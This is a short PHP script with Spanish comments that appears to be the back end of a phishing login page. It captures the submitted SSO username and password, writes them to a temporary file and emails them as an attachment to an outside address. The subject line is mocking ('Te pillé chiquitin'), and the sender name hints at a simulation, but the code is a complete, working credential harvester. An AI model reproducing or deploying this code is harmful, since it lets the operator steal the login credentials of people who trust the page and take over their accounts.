<?php
// Capturar datos del formulario
$usuario = $_POST['ssousername'] ?? '';
$password = $_POST['password'] ?? '';

// Crear el contenido del archivo
$contenido = "Usuario: $usuario\nContraseña: $password\n";

// Crear archivo temporal
$archivo = tempnam(sys_get_temp_dir(), 'datos_');
file_put_contents($archivo, $contenido);

// Parámetros del correo
$destinatario = "mqs562@inlumine.ual.es";
$asunto = "Te pillé chiquitin";
$mensaje = "Se adjunta el archivo con los datos del formulario.";
$nombreAdjunto = "datos.txt";

// Codificar archivo adjunto
$contenidoAdjunto = chunk_split(base64_encode(file_get_contents($archivo)));
$limite = uniqid("limite");
$headers = "From: simulacion@demo.com\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: multipart/mixed; boundary=\"$limite\"\r\n\r\n";

$cuerpo = "--$limite\r\n";
$cuerpo .= "Content-Type: text/plain; charset=utf-8\r\n";
$cuerpo .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
$cuerpo .= "$mensaje\r\n\r\n";
$cuerpo .= "--$limite\r\n";
$cuerpo .= "Content-Type: text/plain; name=\"$nombreAdjunto\"\r\n";
$cuerpo .= "Content-Transfer-Encoding: base64\r\n";
$cuerpo .= "Content-Disposition: attachment; filename=\"$nombreAdjunto\"\r\n\r\n";
$cuerpo .= $contenidoAdjunto . "\r\n";
$cuerpo .= "--$limite--";

// Enviar correo
if (mail($destinatario, $asunto, $cuerpo, $headers)) {
    echo "Correo enviado correctamente.";
} else {
    echo "Error al enviar el correo.";
}

// Eliminar archivo temporal
unlink($archivo);
?>
